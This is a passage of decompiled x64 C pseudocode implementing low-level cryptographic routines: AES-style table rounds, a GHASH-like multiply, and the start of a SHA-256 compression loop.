    v88 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v71] + 3) ^ *(_DWORD *)(v67 - 36);
    LOBYTE(v71) = v72;
    v89 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v72)] + 2) ^ *(_DWORD *)(v67 - 40);
    v90 = HIWORD(v72);
    v91 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v69] + 3) ^ v89;
    v92 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v69)] + 2) ^ v88;
    v93 = HIWORD(v69);
    v94 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v90] + 1) ^ v92;
    v95 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v71)] + 2) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v93]
                                                                            + 1) ^ HIDWORD(qword_13F1C45D0[BYTE1(v90)]);
    v96 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v71] + 3) ^ HIDWORD(qword_13F1C45D0[BYTE1(v93)]);
    v97 = HIWORD(v71);
    v98 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v73] + 3) ^ v95;
    v99 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v73)] + 2) ^ v96;
    v100 = HIWORD(v73);
    v101 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v97] + 1) ^ v99;
    v64 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v100] + 1) ^ HIDWORD(qword_13F1C45D0[BYTE1(v97)]) ^ v91;
    v66 = *(_DWORD *)(v67 - 48) ^ v98;
    v65 = *(_DWORD *)(v67 - 44) ^ v101;
    v63 = HIDWORD(qword_13F1C45D0[BYTE1(v100)]) ^ v94;
    v67 += 32i64;
    if ( (_BYTE)v67 )
      goto LABEL_10;
    v3 = (__m128i *)(v67 - 256);
    v3[13].m128i_i16[1] = LOWORD(qword_13F1C45D0[(unsigned __int8)v63]) ^ BYTE1(qword_13F1C45D0[BYTE1(v64)]);
    v3[13].m128i_i16[3] = LOWORD(qword_13F1C45D0[(unsigned __int8)v66]) ^ BYTE1(qword_13F1C45D0[BYTE1(v63)]);
    v102 = HIWORD(v63);
    v3[13].m128i_i16[5] = LOWORD(qword_13F1C45D0[(unsigned __int8)v65]) ^ BYTE1(qword_13F1C45D0[BYTE1(v66)]);
    v103 = HIWORD(v66);
    v3[13].m128i_i16[7] = LOWORD(qword_13F1C45D0[(unsigned __int8)v64]) ^ BYTE1(qword_13F1C45D0[BYTE1(v65)]);
    v104 = HIWORD(v65);
    v3[13].m128i_i16[6] = LOWORD(qword_13F1C45D0[(unsigned __int8)v103]) ^ BYTE1(qword_13F1C45D0[BYTE1(v102)]);
    v105 = HIWORD(v64);
    v3[13].m128i_i16[0] = LOWORD(qword_13F1C45D0[(unsigned __int8)v104]) ^ BYTE1(qword_13F1C45D0[BYTE1(v103)]);
    v3[13].m128i_i16[2] = LOWORD(qword_13F1C45D0[(unsigned __int8)v105]) ^ BYTE1(qword_13F1C45D0[BYTE1(v104)]);
    v3[13].m128i_i16[4] = LOWORD(qword_13F1C45D0[(unsigned __int8)v102]) ^ BYTE1(qword_13F1C45D0[BYTE1(v105)]);
    v106 = (__m128i *)v3[15].m128i_i64[1];
    v107 = v3[18].m128i_i64[1];
    v108 = v107 <= 16;
    v109 = v107 - 16;
    v110 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)v3[15].m128i_i64[0]), si128);
    v3[15] = _mm_add_epi64(_mm_load_si128(v3 + 17), v3[15]);
    *v106 = _mm_xor_si128(v110, v3[13]);
    if ( v108 )
      break;
    v3[18].m128i_i64[1] = v109;
    if ( (v109 & 1) != 0 )
    {
      v47 = v34;
      v41 = v3->m128i_i32[0];
      v43 = v3->m128i_i32[1];
      v46 = (unsigned __int8)(HIBYTE(v2) ^ v2);
      goto LABEL_9;
    }
    v3[14] = _mm_add_epi64(_mm_load_si128(v3 + 16), v3[14]);
    v8 = v3[12].m128i_i32[0];
    v9 = v3[12].m128i_i32[1];
    v10 = v3[12].m128i_i32[2];
    v11 = v3[12].m128i_i32[3];
LABEL_7:
    v48 = _mm_xor_si128(
            _mm_xor_si128(_mm_loadu_si128((const __m128i *)v3[14].m128i_i64[0]), v7),
            _mm_loadu_si128((const __m128i *)v3[14].m128i_i64[1]));
    v49 = _mm_cvtsi128_si32(v48);
    v50 = _mm_srli_si128(v48, 4);
    v51 = _mm_cvtsi128_si32(v50);
    v52 = _mm_srli_si128(v50, 4);
    v53 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v49]) ^ v8;
    v54 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v49)] + 1) ^ v11;
    v49 >>= 16;
    v55 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v51]) ^ *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v49)] + 3) ^ v9;
    v56 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v51)] + 1) ^ v53;
    v57 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE2(v51)] + 2) ^ v54;
    v58 = *(_DWORD *)((char *)&qword_13F1C45D0[HIBYTE(v51)] + 3) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v49]
                                                                             + 2) ^ v10;
    v59 = _mm_cvtsi128_si32(v52);
    v60 = _mm_cvtsi128_si32(_mm_srli_si128(v52, 4));
    v61 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v59]) ^ v58;
    v62 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v59)] + 1) ^ v55;
    v59 >>= 16;
    v63 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v60]) ^ *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v59)] + 3) ^ v57;
    v64 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v60)] + 1) ^ v61;
    v65 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE2(v60)] + 2) ^ v62;
    v34 = *(_DWORD *)((char *)&qword_13F1C45D0[HIBYTE(v60)] + 3) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v59]
                                                                             + 2) ^ v56;
    v66 = v34;
    v67 = (__int64)v3[4].m128i_i64 + v3[19].m128i_i64[0];
LABEL_10:
    v74 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v64] + 3) ^ *(_DWORD *)(v67 - 52);
    LOBYTE(v64) = v66;
    v75 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v66)] + 2) ^ *(_DWORD *)(v67 - 56);
    v76 = HIWORD(v66);
    v77 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v65] + 3) ^ v75;
    v78 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v65)] + 2) ^ v74;
    v79 = HIWORD(v65);
    v80 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v76] + 1) ^ v78;
    v81 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v64)] + 2) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v79]
                                                                            + 1) ^ HIDWORD(qword_13F1C45D0[BYTE1(v76)]);
    v82 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v64] + 3) ^ HIDWORD(qword_13F1C45D0[BYTE1(v79)]);
    v83 = HIWORD(v64);
    v84 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v63] + 3) ^ v81;
    v85 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v63)] + 2) ^ v82;
    v86 = HIWORD(v63);
    v87 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v83] + 1) ^ v85;
    v71 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v86] + 1) ^ HIDWORD(qword_13F1C45D0[BYTE1(v83)]) ^ v77;
    v72 = *(_DWORD *)(v67 - 64) ^ v84;
    v69 = *(_DWORD *)(v67 - 60) ^ v87;
    v73 = HIDWORD(qword_13F1C45D0[BYTE1(v86)]) ^ v80;
  }
  result = v3 + 7;
  *v3 = 0i64;
  v3[1] = 0i64;
  v3[2] = 0i64;
  v3[3] = 0i64;
  v3[4] = 0i64;
  v3[5] = 0i64;
  v3[6] = 0i64;
  v3[7] = 0i64;
  v3[8] = 0i64;
  v3[9] = 0i64;
  v3[10] = 0i64;
  v3[11] = 0i64;
  v3[12] = 0i64;
  v3[13] = 0i64;
  return result;
}
// 13F13A890: variable 'v2' is possibly undefined
// 13F1C45D0: using guessed type __int64 qword_13F1C45D0[256];

//----- (000000013F13ABC8) ----------------------------------------------------
__int16 __fastcall sub_13F13ABC8(const __m128i *a1, __int64 a2, __m128i *a3, __int64 a4)
{
  __m128i si128; // xmm0
  __m128i v5; // xmm0
  int v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // ebx
  __m128i v9; // xmm5
  __m128i v10; // xmm4
  __m128i v11; // xmm3
  __m128i v12; // xmm2
  __m128i v13; // xmm0
  unsigned int v14; // eax
  __m128i v15; // xmm5
  __m128i v16; // xmm4
  __m128i v17; // xmm3
  __m128i v18; // xmm2
  unsigned int v19; // ebx
  __m128i v20; // xmm5
  __m128i v21; // xmm4
  __m128i v22; // xmm3
  __m128i v23; // xmm2
  __m128i v24; // xmm0
  unsigned int v25; // eax
  __m128i v26; // xmm5
  __m128i v27; // xmm4
  __m128i v28; // xmm3
  __m128i v29; // xmm2
  unsigned int v30; // ebx
  __m128i v31; // xmm5
  __m128i v32; // xmm4
  __m128i v33; // xmm3
  __m128i v34; // xmm2
  __m128i v35; // xmm0
  unsigned int v36; // eax
  __m128i v37; // xmm5
  __m128i v38; // xmm4
  __m128i v39; // xmm3
  __m128i v40; // xmm2
  unsigned int v41; // ebx
  __m128i v42; // xmm5
  __m128i v43; // xmm4
  __m128i v44; // xmm5
  __m128i v45; // xmm4
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  int v48; // eax
  __m128i v49; // xmm0
  unsigned int v50; // eax

  si128 = _mm_load_si128(a3);
  do
  {
    v5 = _mm_xor_si128(si128, _mm_loadu_si128(a1));
    v6 = _mm_cvtsi128_si32(v5);
    v7 = v6 & 0xF0F0F0F0;
    v8 = (16 * v6) & 0xF0F0F0F0;
    v9 = _mm_load_si128((__m128i *)((char *)a3 + BYTE1(v7) + 1056));
    v10 = _mm_load_si128((__m128i *)((char *)a3 + (unsigned __int8)v7 + 1056));
    v7 >>= 16;
    v11 = _mm_load_si128((__m128i *)((char *)a3 + BYTE1(v7) + 1056));
    v12 = _mm_load_si128((__m128i *)((char *)a3 + (unsigned __int8)v7 + 1056));
    v13 = _mm_srli_si128(v5, 4);
    v14 = _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v15 = _mm_xor_si128(v9, *(__m128i *)((char *)&a3[2] + BYTE1(v8)));
    v16 = _mm_xor_si128(v10, *(__m128i *)((char *)&a3[2] + (unsigned __int8)v8));
    v8 >>= 16;
    v17 = _mm_xor_si128(v11, *(__m128i *)((char *)&a3[2] + BYTE1(v8)));
    v18 = _mm_xor_si128(v12, *(__m128i *)((char *)&a3[2] + (unsigned __int8)v8));
    v19 = (16 * _mm_cvtsi128_si32(v13)) & 0xF0F0F0F0;
    v20 = _mm_xor_si128(v15, *(__m128i *)((char *)&a3[82] + BYTE1(v14)));
    v21 = _mm_xor_si128(v16, *(__m128i *)((char *)&a3[82] + (unsigned __int8)v14));
    v14 >>= 16;
    v22 = _mm_xor_si128(v17, *(__m128i *)((char *)&a3[82] + BYTE1(v14)));
    v23 = _mm_xor_si128(v18, *(__m128i *)((char *)&a3[82] + (unsigned __int8)v14));
    v24 = _mm_srli_si128(v13, 4);
    v25 = _mm_cvtsi128_si32(v24) & 0xF0F0F0F0;
    v26 = _mm_xor_si128(v20, *(__m128i *)((char *)&a3[18] + BYTE1(v19)));
    v27 = _mm_xor_si128(v21, *(__m128i *)((char *)&a3[18] + (unsigned __int8)v19));
    v19 >>= 16;
    v28 = _mm_xor_si128(v22, *(__m128i *)((char *)&a3[18] + BYTE1(v19)));
    v29 = _mm_xor_si128(v23, *(__m128i *)((char *)&a3[18] + (unsigned __int8)v19));
    v30 = (16 * _mm_cvtsi128_si32(v24)) & 0xF0F0F0F0;
    v31 = _mm_xor_si128(v26, *(__m128i *)((char *)&a3[98] + BYTE1(v25)));
    v32 = _mm_xor_si128(v27, *(__m128i *)((char *)&a3[98] + (unsigned __int8)v25));
    v25 >>= 16;
    v33 = _mm_xor_si128(v28, *(__m128i *)((char *)&a3[98] + BYTE1(v25)));
    v34 = _mm_xor_si128(v29, *(__m128i *)((char *)&a3[98] + (unsigned __int8)v25));
    v35 = _mm_srli_si128(v24, 4);
    v36 = _mm_cvtsi128_si32(v35) & 0xF0F0F0F0;
    v37 = _mm_xor_si128(v31, *(__m128i *)((char *)&a3[34] + BYTE1(v30)));
    v38 = _mm_xor_si128(v32, *(__m128i *)((char *)&a3[34] + (unsigned __int8)v30));
    v30 >>= 16;
    v39 = _mm_xor_si128(v33, *(__m128i *)((char *)&a3[34] + BYTE1(v30)));
    v40 = _mm_xor_si128(v34, *(__m128i *)((char *)&a3[34] + (unsigned __int8)v30));
    v41 = (16 * _mm_cvtsi128_si32(v35)) & 0xF0F0F0F0;
    v42 = _mm_xor_si128(v37, *(__m128i *)((char *)&a3[114] + BYTE1(v36)));
    v43 = _mm_xor_si128(v38, *(__m128i *)((char *)&a3[114] + (unsigned __int8)v36));
    v36 >>= 16;
    v44 = _mm_xor_si128(v42, *(__m128i *)((char *)&a3[50] + BYTE1(v41)));
    v45 = _mm_xor_si128(v43, *(__m128i *)((char *)&a3[50] + (unsigned __int8)v41));
    v41 >>= 16;
    v46 = _mm_xor_si128(
            _mm_xor_si128(v39, *(__m128i *)((char *)&a3[114] + BYTE1(v36))),
            *(__m128i *)((char *)&a3[50] + BYTE1(v41)));
    v47 = _mm_xor_si128(
            _mm_xor_si128(
              _mm_xor_si128(v40, *(__m128i *)((char *)&a3[114] + (unsigned __int8)v36)),
              *(__m128i *)((char *)&a3[50] + (unsigned __int8)v41)),
            _mm_slli_si128(v46, 1));
    v48 = *(unsigned __int16 *)(a4 + 2 * _mm_srli_si128(v46, 15).m128i_u64[0]) << 8;
    v49 = _mm_xor_si128(v44, _mm_slli_si128(v47, 1));
    LOWORD(v48) = *(_WORD *)(a4 + 2 * _mm_srli_si128(v47, 15).m128i_u64[0]) ^ v48;
    v50 = v48 << 8;
    LOWORD(v50) = *(_WORD *)(a4 + 2 * _mm_srli_si128(v49, 15).m128i_u64[0]) ^ v50;
    si128 = _mm_xor_si128(_mm_cvtsi32_si128(v50), _mm_xor_si128(v45, _mm_slli_si128(v49, 1)));
    ++a1;
    --a2;
  }
  while ( a2 );
  *a3 = si128;
  return v50;
}

//----- (000000013F13AE48) ----------------------------------------------------
__int64 __fastcall sub_13F13AE48(const __m128i *a1, __int64 a2, __m128i *a3)
{
  __m128i si128; // xmm0
  __m128i v4; // xmm1
  int v5; // eax
  __m128i v6; // xmm1
  __m128i v7; // xmm0
  int v8; // eax
  __m128i v9; // xmm1
  __m128i v10; // xmm0
  int v11; // eax
  __m128i v12; // xmm0
  unsigned int v13; // eax
  __m128i v14; // xmm0
  __int64 result; // rax

  si128 = _mm_load_si128(a3);
  do
  {
    v4 = _mm_xor_si128(_mm_loadu_si128(a1), si128);
    v5 = _mm_cvtsi128_si32(v4);
    v6 = _mm_srli_si128(v4, 4);
    v7 = _mm_xor_si128(
           _mm_xor_si128(
             _mm_xor_si128(_mm_xor_si128((__m128i)0i64, a3[(unsigned __int8)v5 + 2]), a3[BYTE1(v5) + 258]),
             a3[BYTE2(v5) + 514]),
           a3[HIBYTE(v5) + 770]);
    v8 = _mm_cvtsi128_si32(v6);
    v9 = _mm_srli_si128(v6, 4);
    v10 = _mm_xor_si128(
            _mm_xor_si128(
              _mm_xor_si128(_mm_xor_si128(v7, a3[(unsigned __int8)v8 + 1026]), a3[BYTE1(v8) + 1282]),
              a3[BYTE2(v8) + 1538]),
            a3[HIBYTE(v8) + 1794]);
    v11 = _mm_cvtsi128_si32(v9);
    v12 = _mm_xor_si128(
            _mm_xor_si128(
              _mm_xor_si128(_mm_xor_si128(v10, a3[(unsigned __int8)v11 + 2050]), a3[BYTE1(v11) + 2306]),
              a3[BYTE2(v11) + 2562]),
            a3[HIBYTE(v11) + 2818]);
    v13 = _mm_cvtsi128_si32(_mm_srli_si128(v9, 4));
    v14 = _mm_xor_si128(_mm_xor_si128(v12, a3[(unsigned __int8)v13 + 3074]), a3[BYTE1(v13) + 3330]);
    result = HIWORD(v13);
    si128 = _mm_xor_si128(_mm_xor_si128(v14, a3[(unsigned __int8)result + 3586]), a3[BYTE1(result) + 3842]);
    ++a1;
    --a2;
  }
  while ( a2 );
  *a3 = si128;
  return result;
}

//----- (000000013F13AF90) ----------------------------------------------------
__int64 __fastcall sub_13F13AF90(__m128i *a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 *v3; // rsi
  __m128i si128; // xmm0
  __m128i v5; // xmm1
  int v6; // edi
  __int32 v7; // edx
  int v8; // ebx
  __int32 v9; // edi
  __int32 v10; // ebp
  int v11; // edx
  int v12; // edi
  int v13; // ebx
  __int32 v14; // edx
  int v15; // ebp
  int v16; // edi
  int v17; // edx
  int v18; // ebx
  int v19; // edi
  __int32 v20; // ebp
  int v21; // edx
  int v22; // edi
  int v23; // ebx
  __int32 v24; // edx
  int v25; // ebp
  int v26; // edi
  int v27; // edx
  int v28; // ebx
  int v29; // edx
  int v30; // edi
  int v31; // ebx
  int v32; // edi
  int v33; // edx
  int v34; // ebx
  int v35; // edx
  int v36; // edi
  int v37; // ebx
  int v38; // edi
  int v39; // edx
  int v40; // ebx
  int v41; // edx
  int v42; // edi
  int v43; // ebx
  int v44; // edi
  int v45; // edx
  int v46; // ebx
  int v47; // edx
  int v48; // edi
  int v49; // ebx
  int v50; // edi
  int v51; // edx
  int v52; // ebx
  int v53; // edx
  int v54; // edi
  int v55; // ebx
  int v56; // edi
  int v57; // edx
  int v58; // ebx
  int v59; // edx
  int v60; // edi
  __int64 result; // rax
  int v62; // ebx
  int v63; // ecx
  __int32 v64; // edi
  __int32 v65; // ecx
  int v66; // edx
  __int32 v67; // ebp
  int v68; // edi
  int v69; // edx
  int v70; // ebx
  int v71; // edi
  int v72; // edx
  __int32 v73; // ebx
  int v74; // ecx
  __int32 v75; // ebp
  int v76; // ebx
  int v77; // edx
  __int32 v78; // edi
  int v79; // ebx
  int v80; // edx
  int v81; // edi
  int v82; // ebx
  int v83; // edi
  __int32 v84; // edx
  int v85; // ebx
  int v86; // edi
  int v87; // edx
  int v88; // ebx
  int v89; // edx
  int v90; // edi
  int v91; // ebx
  int v92; // edx
  int v93; // edi
  int v94; // ebx
  int v95; // edi
  __int32 v96; // edx
  int v97; // ebx
  int v98; // edi
  int v99; // edx
  int v100; // ebx
  int v101; // edx
  __int32 v102; // edi
  int v103; // ebx
  int v104; // edx
  int v105; // edi
  int v106; // ebx
  int v107; // edi
  __int32 v108; // edx
  int v109; // ebx
  int v110; // edi
  int v111; // edx
  int v112; // ebx
  int v113; // edx
  int v114; // edi
  int v115; // ebx
  int v116; // edx
  int v117; // edi
  int v118; // ebx
  int v119; // edi
  __int32 v120; // edx
  int v121; // ebx
  int v122; // edi
  int v123; // edx
  int v124; // ebx
  int v125; // edx
  __int32 v126; // edi
  int v127; // ebx
  int v128; // edx
  int v129; // edi
  int v130; // ebx
  int v131; // edi
  __int32 v132; // edx
  int v133; // ebx
  int v134; // edi
  int v135; // edx
  int v136; // ebx
  int v137; // edx
  int v138; // edi
  int v139; // ebx
  int v140; // edx
  int v141; // edi
  int v142; // ebx
  int v143; // edi
  __int32 v144; // edx
  int v145; // ebx
  int v146; // edi
  int v147; // edx
  int v148; // ebx
  int v149; // edx
  __int32 v150; // edi
  int v151; // ebx
  int v152; // edx
  int v153; // edi
  int v154; // ebx
  int v155; // edi
  __int32 v156; // edx
  int v157; // ebx
  int v158; // edi
  int v159; // edx
  int v160; // ebx
  int v161; // edx
  int v162; // edi
  int v163; // ebx
  int v164; // edx
  int v165; // edi
  int v166; // ebx
  int v167; // ecx
  int v168; // [rsp+0h] [rbp-A8h]
  int v169; // [rsp+0h] [rbp-A8h]
  int v170; // [rsp+0h] [rbp-A8h]
  __m128i v171; // [rsp+0h] [rbp-A8h]
  __int32 v172; // [rsp+4h] [rbp-A4h]
  int v173; // [rsp+4h] [rbp-A4h]
  int v174; // [rsp+4h] [rbp-A4h]
  int v175; // [rsp+8h] [rbp-A0h]
  int v176; // [rsp+8h] [rbp-A0h]
  int v177; // [rsp+8h] [rbp-A0h]
  __int32 v178; // [rsp+Ch] [rbp-9Ch]
  int v179; // [rsp+Ch] [rbp-9Ch]
  int v180; // [rsp+Ch] [rbp-9Ch]
  int v181; // [rsp+10h] [rbp-98h]
  int v182; // [rsp+10h] [rbp-98h]
  int v183; // [rsp+10h] [rbp-98h]
  __m128i v184; // [rsp+10h] [rbp-98h]
  __int32 v185; // [rsp+14h] [rbp-94h]
  __int32 v186; // [rsp+14h] [rbp-94h]
  int v187; // [rsp+14h] [rbp-94h]
  __int32 v188; // [rsp+18h] [rbp-90h]
  int v189; // [rsp+18h] [rbp-90h]
  int v190; // [rsp+18h] [rbp-90h]
  __int32 v191; // [rsp+1Ch] [rbp-8Ch]
  __int32 v192; // [rsp+1Ch] [rbp-8Ch]
  int v193; // [rsp+1Ch] [rbp-8Ch]
  unsigned __int64 v194; // [rsp+20h] [rbp-88h]
  unsigned __int64 v195; // [rsp+28h] [rbp-80h]
  unsigned __int64 v196; // [rsp+30h] [rbp-78h]
  unsigned __int64 v197; // [rsp+38h] [rbp-70h]
  unsigned __int64 v198; // [rsp+40h] [rbp-68h]
  unsigned __int64 v199; // [rsp+48h] [rbp-60h]
  unsigned __int64 v200; // [rsp+50h] [rbp-58h]
  unsigned __int64 v201; // [rsp+58h] [rbp-50h]
  unsigned __int64 *v203; // [rsp+70h] [rbp-38h]
  unsigned __int64 *v204; // [rsp+78h] [rbp-30h]

  v3 = qword_13F187770;
  v203 = a2;
  v204 = (unsigned __int64 *)((char *)a2 + a3);
  si128 = _mm_load_si128(a1);
  v5 = _mm_load_si128(a1 + 1);
  do
  {
    v3 -= 24;
    v201 = _byteswap_uint64(*a2);
    v200 = _byteswap_uint64(a2[1]);
    v199 = _byteswap_uint64(a2[2]);
    v198 = _byteswap_uint64(a2[3]);
    v197 = _byteswap_uint64(a2[4]);
    v196 = _byteswap_uint64(a2[5]);
    v195 = _byteswap_uint64(a2[6]);
    v194 = _byteswap_uint64(a2[7]);
    v6 = __ROR4__(v5.m128i_i32[0], 6);
    v7 = (__ROR4__(v6, 5) ^ v6 ^ __ROR4__(v5.m128i_i32[0], 25))
       + v5.m128i_i32[3]
       + HIDWORD(v201)
       + *(_DWORD *)v3
       + (v5.m128i_i32[2] ^ v5.m128i_i32[0] & (v5.m128i_i32[2] ^ v5.m128i_i32[1]));
    v8 = __ROR4__(si128.m128i_i32[0], 2);
    v178 = si128.m128i_i32[3] + v7;
    v191 = (__ROR4__(v8, 11) ^ v8 ^ __ROR4__(si128.m128i_i32[0], 22))
         + v7
         + (si128.m128i_i32[1] ^ (si128.m128i_i32[1] ^ si128.m128i_i32[0]) & (si128.m128i_i32[2] ^ si128.m128i_i32[1]));
    v9 = v5.m128i_i32[1] ^ (si128.m128i_i32[3] + v7) & (v5.m128i_i32[1] ^ v5.m128i_i32[0]);
    v10 = si128.m128i_i32[3] + v7;
    v11 = __ROR4__(si128.m128i_i32[3] + v7, 6);
    v12 = (__ROR4__(v11, 5) ^ v11 ^ __ROR4__(v10, 25)) + v5.m128i_i32[2] + v201 + *((_DWORD *)v3 + 1) + v9;
    v13 = __ROR4__(v191, 2);
    v175 = si128.m128i_i32[2] + v12;
    v188 = (__ROR4__(v13, 11) ^ v13 ^ __ROR4__(v191, 22))
         + v12
         + (si128.m128i_i32[0] ^ (si128.m128i_i32[0] ^ v191) & (si128.m128i_i32[1] ^ si128.m128i_i32[0]));
    v14 = v5.m128i_i32[0] ^ (si128.m128i_i32[2] + v12) & (v5.m128i_i32[0] ^ v178);
    v15 = si128.m128i_i32[2] + v12;
    v16 = __ROR4__(si128.m128i_i32[2] + v12, 6);
    v17 = (__ROR4__(v16, 5) ^ v16 ^ __ROR4__(v15, 25)) + v5.m128i_i32[1] + HIDWORD(v200) + *((_DWORD *)v3 + 2) + v14;
    v18 = __ROR4__(v188, 2);
    v172 = si128.m128i_i32[1] + v17;
    v185 = (__ROR4__(v18, 11) ^ v18 ^ __ROR4__(v188, 22)) + v17 + (v191 ^ (v191 ^ v188) & (si128.m128i_i32[0] ^ v191));
    v19 = v178 ^ (si128.m128i_i32[1] + v17) & (v178 ^ v175);
    v20 = si128.m128i_i32[1] + v17;
    v21 = __ROR4__(si128.m128i_i32[1] + v17, 6);
    v22 = (__ROR4__(v21, 5) ^ v21 ^ __ROR4__(v20, 25)) + v5.m128i_i32[0] + v200 + *((_DWORD *)v3 + 3) + v19;
    v23 = __ROR4__(v185, 2);
    v168 = si128.m128i_i32[0] + v22;
    v181 = (__ROR4__(v23, 11) ^ v23 ^ __ROR4__(v185, 22)) + v22 + (v188 ^ (v188 ^ v185) & (v191 ^ v188));
    v24 = v175 ^ (si128.m128i_i32[0] + v22) & (v175 ^ v172);
    v25 = si128.m128i_i32[0] + v22;
    v26 = __ROR4__(si128.m128i_i32[0] + v22, 6);
    v27 = (__ROR4__(v26, 5) ^ v26 ^ __ROR4__(v25, 25)) + v178 + HIDWORD(v199) + *((_DWORD *)v3 + 4) + v24;
    v28 = __ROR4__(v181, 2);
    v192 = v191 + v27;
    v179 = (__ROR4__(v28, 11) ^ v28 ^ __ROR4__(v181, 22)) + v27 + (v185 ^ (v185 ^ v181) & (v188 ^ v185));
    v29 = __ROR4__(v192, 6);
    v30 = (__ROR4__(v29, 5) ^ v29 ^ __ROR4__(v192, 25))
        + v175
        + v199
        + *((_DWORD *)v3 + 5)
        + (v172 ^ v192 & (v172 ^ v168));
    v31 = __ROR4__(v179, 2);
    v189 = v188 + v30;
    v176 = (__ROR4__(v31, 11) ^ v31 ^ __ROR4__(v179, 22)) + v30 + (v181 ^ (v181 ^ v179) & (v185 ^ v181));
    v32 = __ROR4__(v189, 6);
    v33 = (__ROR4__(v32, 5) ^ v32 ^ __ROR4__(v189, 25))
        + v172
        + HIDWORD(v198)
        + *((_DWORD *)v3 + 6)
        + (v168 ^ v189 & (v168 ^ v192));
    v34 = __ROR4__(v176, 2);
    v186 = v185 + v33;
    v173 = (__ROR4__(v34, 11) ^ v34 ^ __ROR4__(v176, 22)) + v33 + (v179 ^ (v179 ^ v176) & (v181 ^ v179));
    v35 = __ROR4__(v186, 6);
    v36 = (__ROR4__(v35, 5) ^ v35 ^ __ROR4__(v186, 25))
        + v168
        + v198
        + *((_DWORD *)v3 + 7)
        + (v192 ^ v186 & (v192 ^ v189));
    v37 = __ROR4__(v173, 2);
    v182 = v181 + v36;
    v169 = (__ROR4__(v37, 11) ^ v37 ^ __ROR4__(v173, 22)) + v36 + (v176 ^ (v176 ^ v173) & (v179 ^ v176));
    v38 = __ROR4__(v182, 6);
    v39 = (__ROR4__(v38, 5) ^ v38 ^ __ROR4__(v182, 25))
        + v192
        + HIDWORD(v197)
        + *((_DWORD *)v3 + 8)
        + (v189 ^ v182 & (v189 ^ v186));
    v40 = __ROR4__(v169, 2);
    v180 = v179 + v39;
    v193 = (__ROR4__(v40, 11) ^ v40 ^ __ROR4__(v169, 22)) + v39 + (v173 ^ (v173 ^ v169) & (v176 ^ v173));
    v41 = __ROR4__(v180, 6);
    v42 = (__ROR4__(v41, 5) ^ v41 ^ __ROR4__(v180, 25))
        + v189
        + v197
        + *((_DWORD *)v3 + 9)
        + (v186 ^ v180 & (v186 ^ v182));
    v43 = __ROR4__(v193, 2);
    v177 = v176 + v42;
    v190 = (__ROR4__(v43, 11) ^ v43 ^ __ROR4__(v193, 22)) + v42 + (v169 ^ (v169 ^ v193) & (v173 ^ v169));
    v44 = __ROR4__(v177, 6);
    v45 = (__ROR4__(v44, 5) ^ v44 ^ __ROR4__(v177, 25))
        + v186
        + HIDWORD(v196)
        + *((_DWORD *)v3 + 10)
        + (v182 ^ v177 & (v182 ^ v180));
    v46 = __ROR4__(v190, 2);
    v174 = v173 + v45;
    v187 = (__ROR4__(v46, 11) ^ v46 ^ __ROR4__(v190, 22)) + v45 + (v193 ^ (v193 ^ v190) & (v169 ^ v193));
    v47 = __ROR4__(v174, 6);
    v48 = (__ROR4__(v47, 5) ^ v47 ^ __ROR4__(v174, 25))
        + v182
        + v196
        + *((_DWORD *)v3 + 11)
        + (v180 ^ v174 & (v180 ^ v177));
    v49 = __ROR4__(v187, 2);
    v170 = v169 + v48;
    v183 = (__ROR4__(v49, 11) ^ v49 ^ __ROR4__(v187, 22)) + v48 + (v190 ^ (v190 ^ v187) & (v193 ^ v190));
    v50 = __ROR4__(v170, 6);
    v51 = (__ROR4__(v50, 5) ^ v50 ^ __ROR4__(v170, 25))
        + v180
        + HIDWORD(v195)
        + *((_DWORD *)v3 + 12)
        + (v177 ^ v170 & (v177 ^ v174));
    v52 = __ROR4__(v183, 2);
    v184.m128i_i32[3] = v193 + v51;
    v171.m128i_i32[3] = (__ROR4__(v52, 11) ^ v52 ^ __ROR4__(v183, 22)) + v51 + (v187 ^ (v187 ^ v183) & (v190 ^ v187));
    v53 = __ROR4__(v184.m128i_i32[3], 6);
